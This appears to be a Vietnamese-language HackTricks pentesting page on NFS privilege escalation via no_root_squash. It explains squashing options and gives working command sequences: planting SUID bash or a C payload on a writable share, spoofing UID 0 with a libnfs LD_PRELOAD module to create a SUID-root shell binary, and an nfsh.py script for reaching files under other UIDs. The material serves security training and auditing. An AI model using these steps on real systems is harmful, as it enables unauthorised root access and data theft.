# NFS No Root Squash: Leo thang đặc quyền do cấu hình sai

{{#include ../../banners/hacktricks-training.md}}

## Thông tin cơ bản về Squashing

Với NFS AUTH_SYS/AUTH_UNIX, máy chủ dựa vào `uid` và `gid` được cung cấp trong mỗi yêu cầu RPC để kiểm tra quyền truy cập tệp. Các security flavor khác, chẳng hạn như Kerberos, sử dụng thông tin xác thực khác và máy chủ có thể ánh xạ thông tin xác thực dạng số trước khi kiểm tra quyền.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Ánh xạ mọi UID và GID sang tài khoản anonymous, mặc định là `nobody` (65534) trên Linux. `no_all_squash` là mặc định đối với các yêu cầu không phải root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Đây là mặc định trên Linux, ánh xạ các yêu cầu có UID/GID 0 (root) sang tài khoản anonymous; các UID và GID khác không bị squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Tắt root squashing, do đó các yêu cầu có UID/GID 0 có thể được máy chủ xử lý với quyền root.<sup>[[4]](#references)</sup>

Nếu một client được phép mount một export có quyền ghi trong **`/etc/exports`** được cấu hình với **`no_root_squash`**, các yêu cầu UID/GID 0 của client đó có thể ghi vào đó với quyền root của máy chủ.<sup>[[4]](#references)</sup>

`root_squash` chỉ ánh xạ lại UID/GID 0; với AUTH_SYS, **UID/GID dạng số khác 0** của một client được phép vẫn có thể khớp với một tài khoản khác trên máy chủ. Vì vậy, ngay cả khi bật root squashing, một export có quyền ghi vẫn có thể trở thành đường dẫn truy cập chéo người dùng nếu client có thể tạo tệp với danh tính số đó và máy chủ cho phép truy cập. Đối với việc chuyển giao bằng SUID/SGID, hãy xác minh thêm chủ sở hữu của tệp sau khi tạo, quyền thực thi, trạng thái `nosuid` của mount trên máy chủ, ACL và SELinux hoặc các chính sách khác. Chỉ riêng đường dẫn được export, tùy chọn `rw` hoặc số UID/GID trùng khớp không chứng minh rằng client được phép truy cập, export đang hoạt động hoặc hai máy chủ có cùng cách ánh xạ danh tính hiệu lực. Kiểm tra thụ động `/etc/exports` và metadata cục bộ; không mount share mới hoặc tạo tệp thử nghiệm trong quá trình liệt kê.<sup>[[4]](#references)[[5]](#references)</sup>

Để biết thêm thông tin về **NFS**, hãy xem:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Leo thang đặc quyền

### Exploit từ xa

Tùy chọn 1 sử dụng bash:
- Trên một client được phép, mount export có quyền ghi với tư cách root, sao chép **`/bin/bash`** vào đó, đặt bit **SUID**, rồi thực thi tệp từ một mount trên máy nạn nhân không sử dụng `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Để tệp đã tải lên vẫn thuộc sở hữu của root, máy chủ phải sử dụng **`no_root_squash`**. Nếu root bị squash, chỉ có thể tạo binary SUID cho một tài khoản khác khi client có thể hợp lệ tạo tệp hoặc sở hữu tệp đó bằng UID/GID dạng số của tài khoản ấy.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 sử dụng mã C đã biên dịch:
- Mount thư mục từ một client được phép, sao chép payload đã biên dịch khai thác quyền SUID vào đó, đặt bit **SUID** và thực thi payload từ máy nạn nhân (xem một số [payload C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Các hạn chế tương tự như trước đây

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Khai thác cục bộ

> [!TIP]
> Lưu ý rằng nếu bạn có thể tạo **tunnel từ máy của mình đến máy nạn nhân, bạn vẫn có thể dùng phiên bản Remote để khai thác việc leo thang đặc quyền bằng cách tunnel các cổng cần thiết**.\
> Mẹo sau hữu ích khi `/etc/exports` giới hạn quyền export cho IP của nạn nhân: client từ xa không thể mount thư mục này, nhưng kỹ thuật cục bộ có thể hoạt động thông qua share đã được mount trên máy chủ được cho phép.<sup>[[2]](#references)</sup>\
> Với phương pháp libnfs không cần đặc quyền này, export trong **`/etc/exports`** phải dùng cờ `insecure` để tiến trình có thể sử dụng cổng nguồn không dành riêng; `secure` là mặc định, nhưng tiến trình có thể bind một cổng dành riêng thì không cần tùy chọn này.<sup>[[1]](#references)[[4]](#references)</sup>

### Thông tin cơ bản

Client NFSv3 AUTH_UNIX gửi kèm UID, GID hiệu lực và các nhóm trong mỗi lời gọi, còn server sử dụng các thông tin này để kiểm tra quyền. Kỹ thuật cục bộ này khai thác cơ chế đó bằng cách giả mạo thông tin xác thực RPC thông qua [libnfs](https://github.com/sahlberg/libnfs); module preload của thư viện hỗ trợ ghi đè UID/GID trong ngữ cảnh NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Biên dịch thư viện

Ví dụ libnfs có thể cần điều chỉnh cho kernel mục tiêu; hướng dẫn được dùng ở đây ghi rõ cần chú thích các syscall fallocate trước khi biên dịch module preload.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Thực hiện exploit

Ví dụ này tạo một chương trình trợ giúp C nhỏ để khởi chạy shell, sau đó đặt chương trình này trên share và dùng `ld_nfs.so` với UID 0 trong ngữ cảnh NFS để biến nó thành SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Biên dịch mã exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Đặt exploit lên thư mục chia sẻ và sửa quyền của nó bằng cách giả mạo UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Thực thi exploit để giành quyền root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Thưởng thêm: NFShell để truy cập tệp một cách kín đáo

Sau khi có quyền truy cập root, mẫu `nfsh.py` này đặt effective UID thành UID của tệp mục tiêu trước khi chạy lệnh, cho phép truy cập mà không cần thay đổi quyền sở hữu đệ quy.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Chạy như sau:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Câu chuyện về một cách leo thang đặc quyền NFS ít được biết đến](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Đặc tả giao thức NFS phiên bản 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
